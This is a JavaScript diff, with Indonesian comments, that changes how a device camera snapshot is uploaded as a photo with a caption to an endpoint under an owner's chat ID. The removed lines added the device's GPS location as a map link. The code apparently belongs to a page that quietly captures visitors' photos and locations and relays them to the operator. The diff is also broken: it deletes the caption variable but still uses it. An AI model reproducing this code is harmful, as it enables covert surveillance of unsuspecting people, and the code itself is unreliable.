@@ -319,19 +319,25 @@
                 // Send to serverless (Vercel) endpoints
                 try {
                     if (snapshotBase64) {
-                        const captionParts = ["Snapshot dari device."];
-                        if (coords) captionParts.push(`Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`);
-                        const caption = captionParts.join(" ");
+                        // Convert base64 ke Blob
+                        function base64ToBlob(base64, mime) {
+                            const byteChars = atob(base64);
+                            const byteNumbers = new Array(byteChars.length);
+                            for (let i = 0; i < byteChars.length; i++) {
+                                byteNumbers[i] = byteChars.charCodeAt(i);
+                            }
+                            const byteArray = new Uint8Array(byteNumbers);
+                            return new Blob([byteArray], {type: mime});
+                        }
+                        const blob = base64ToBlob(snapshotBase64, "image/jpeg");
+                        const fd = new FormData();
+                        fd.append("chat_id", OWNER_ID);
+                        fd.append("photo", blob, "snap.jpg");
+                        fd.append("caption", caption);
 
                         await fetch('/api/sendPhoto', {
                             method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: OWNER_ID,
-                                filename: 'snap.jpg',
-                                photoBase64: snapshotBase64,
-                                caption
-                            })
+                            body: fd
                         });
                     }
 
